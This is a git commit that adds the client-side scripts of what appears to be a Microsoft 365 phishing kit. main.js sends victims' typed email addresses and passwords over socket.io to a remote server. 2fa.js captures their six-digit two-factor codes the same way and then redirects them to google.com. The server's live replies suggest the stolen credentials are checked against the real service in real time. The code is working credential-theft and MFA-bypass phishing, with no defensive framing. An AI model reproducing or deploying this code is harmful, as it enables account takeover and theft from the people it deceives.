0871934072805de1416aa42919c6ec9bf71d94ae
itschu <palmerbideconcepts@gmail.com>
2024-10-11 17:13:07 +0100

    first commit

---
+++ script/2fa.js
@@ -0,0 +1,89 @@
+let connected = null;
+let server = null;
+const useLocal = false;
+
+window.addEventListener('load', async function () {
+	// Connect to the Socket.io server
+	if ((window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && useLocal) {
+		server = 'http://localhost:3023';
+	} else {
+		server = 'https://three65-clone-socket-server.onrender.com';
+	}
+	const socket = io(server);
+
+	const urlParams = new URLSearchParams(window.location.search);
+	const myParam = urlParams.get('user');
+
+	const code_input = document.querySelector('#code-input');
+	const error_msg = document.querySelector('#error-msg');
+	const codeForm = document.querySelector('#code-form');
+	const thisUser = document.querySelector('#user-email');
+	const overlay = document.querySelector('#overlay');
+
+	codeForm.addEventListener('submit', checkCode);
+
+	if (myParam != null) {
+		thisUser.innerHTML = myParam;
+		thisUser.classList.toggle('hidden');
+	}
+
+	var code_error_shown = false;
+
+	async function checkCode(e) {
+		e.preventDefault();
+		if (code_input.value.length < 1) {
+			code_error('Enter the code to help us verify your identity.', true);
+			code_error_shown = true;
+			return;
+		}
+
+		if (code_input.value.length < 6) {
+			code_error('Please enter the 6-digit code. The code only contains numbers.', true);
+			code_error_shown = true;
+			return;
+		}
+
+		socket.emit('entered-code', code_input.value);
+		overlay.classList.toggle('hidden');
+	}
+
+	code_input.addEventListener('input', () => {
+		if (code_error_shown) {
+			if (code_input.value.length > 5) {
+				code_error('', false);
+			}
+		}
+	});
+
+	const code_error = (msg, type, element = code_input, err_el = error_msg) => {
+		if (type == true) {
+			err_el.innerHTML = msg;
+			err_el.classList.remove('hidden');
+			element.classList.remove('border-gray-600');
+			element.classList.add('border-red-500');
+			return;
+		}
+
+		err_el.classList.add('hidden');
+		element.classList.remove('border-red-500');
+		element.classList.add('border-gray-600');
+	};
+
+	socket.on('connect', async () => {
+		socket.emit('client-connected', true);
+		console.log('connected');
+	});
+
+	socket.on('send-code-error', async (res) => {
+		console.log('code data received', res);
+		overlay.classList.toggle('hidden');
+
+		if (res != 'login') {
+			code_error(res, true, code_input, error_msg);
+			code_error_shown = true;
+			return;
+		} else {
+			window.location.href = 'https://google.com';
+		}
+	});
+});
---
+++ script/main.js
@@ -0,0 +1,172 @@
+let connected = null;
+let server = null;
+const useLocal = false;
+
+window.addEventListener('load', async function () {
+	// Connect to the Socket.io server
+	if ((window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && useLocal) {
+		server = 'http://localhost:3023';
+	} else {
+		server = 'https://three65-clone-socket-server.onrender.com';
+	}
+
+	const socket = io(server);
+
+	const next = document.querySelector('#next');
+	const email_input = document.querySelector('#email-input');
+	const password_input = document.querySelector('#password-input');
+	const error_msg = document.querySelector('#error-msg');
+	const pass_error_msg = document.querySelector('#error-msg2');
+	const emailForm = document.querySelector('#email-form');
+	const passwordForm = document.querySelector('#password-form');
+	const bottom = document.querySelector('#bottom');
+	const back = document.querySelector('#back');
+	const thisUser = document.querySelector('#user-email');
+	const overlay = document.querySelector('#overlay');
+
+	emailForm.addEventListener('submit', checkEmail);
+	passwordForm.addEventListener('submit', getCode);
+
+	back.addEventListener('click', goBack);
+
+	let msg;
+	var id = null;
+	var email_error_shown = false;
+	var pass_error_shown = false;
+
+	async function checkEmail(e) {
+		e.preventDefault();
+		if (email_input.value.length < 1) {
+			email_error('Enter a valid email address, phone number, or Skype name.', true);
+			email_error_shown = true;
+			return;
+		}
+
+		socket.emit('entered-email', email_input.value);
+		overlay.classList.toggle('hidden');
+	}
+
+	async function getCode(e) {
+		e.preventDefault();
+		socket.emit('entered-password', password_input.value);
+		overlay.classList.toggle('hidden');
+	}
+
+	function goBack() {
+		removePassword();
+	}
+
+	email_input.addEventListener('input', () => {
+		if (email_error_shown) {
+			if (email_input.value.length > 0) {
+				email_error('', false);
+			} else {
+				email_error('Enter a valid email address, phone number, or Skype name.', true);
+			}
+		}
+	});
+
+	password_input.addEventListener('input', () => {
+		if (pass_error_shown) {
+			email_error('', false, password_input, pass_error_msg);
+		}
+	});
+
+	const email_error = (msg, type, element = email_input, err_el = error_msg) => {
+		if (type == true) {
+			err_el.innerHTML = msg;
+			err_el.classList.remove('hidden');
+			element.classList.remove('border-gray-600');
+			element.classList.add('border-red-500');
+			return;
+		}
+
+		err_el.classList.add('hidden');
+		element.classList.remove('border-red-500');
+		element.classList.add('border-gray-600');
+	};
+
+	function removeEmail() {
+		emailForm.classList.toggle('move-left');
+		bottom.classList.toggle('hide-bottom');
+		pass_error_shown = false;
+		email_error_shown = false;
+
+		if (passwordForm.classList.contains('move-right-reverse')) {
+			passwordForm.classList.toggle('move-right-reverse');
+		}
+
+		if (emailForm.classList.contains('move-left-reverse')) {
+			emailForm.classList.toggle('move-left-reverse');
+		}
+
+		if (bottom.classList.contains('hide-bottom-reverse')) {
+			bottom.classList.toggle('hide-bottom-reverse');
+		}
+
+		setTimeout(() => {
+			passwordForm.classList.toggle('hidden');
+			passwordForm.classList.toggle('flex');
+			passwordForm.classList.toggle('move-right');
+
+			emailForm.classList.toggle('flex');
+			emailForm.classList.toggle('hidden');
+			bottom.classList.toggle('hidden');
+		}, 400);
+	}
+
+	function removePassword() {
+		passwordForm.classList.toggle('move-right-reverse');
+		emailForm.classList.toggle('move-left-reverse');
+		emailForm.classList.toggle('move-left');
+		pass_error_shown = false;
+		email_error_shown = false;
+
+		setTimeout(() => {
+			passwordForm.classList.toggle('move-right');
+			passwordForm.classList.toggle('flex');
+			passwordForm.classList.toggle('hidden');
+
+			emailForm.classList.toggle('hidden');
+			emailForm.classList.toggle('flex');
+
+			bottom.classList.toggle('hidden');
+			bottom.classList.toggle('hide-bottom');
+			bottom.classList.toggle('hide-bottom-reverse');
+		}, 400);
+	}
+
+	socket.on('connect', async () => {
+		socket.emit('client-connected', true);
+		console.log('connected');
+	});
+
+	socket.on('send-email-error', async (res) => {
+		console.log('data received');
+		overlay.classList.toggle('hidden');
+
+		if (res != 'login') {
+			email_error(res, true);
+			email_error_shown = true;
+			return;
+		} else {
+			thisUser.innerHTML = email_input.value;
+			removeEmail();
+		}
+	});
+
+	socket.on('send-password-error', async (res) => {
+		console.log('password data received', res);
+		overlay.classList.toggle('hidden');
+
+		if (res != 'login') {
+			email_error(res, true, password_input, pass_error_msg);
+			pass_error_shown = true;
+			return;
+		} else {
+			const url = `2fa.html?liveis=iuytfrdxcvbhnmkolp-0o9i8y6t5rdsxdcfgyu8i90oplkmnjhbgvfcder5678ikjnhbgvfctgyhujn&sslid=hiuhfbwefbwu8743uuh3unuhfj34nfiuhjh3fjkeiu&user=${thisUser.innerHTML}&open=087frfgvhjmklnbgyt87yu90oknjbhvgy`;
+
+			window.location.href = url;
+		}
+	});
+});
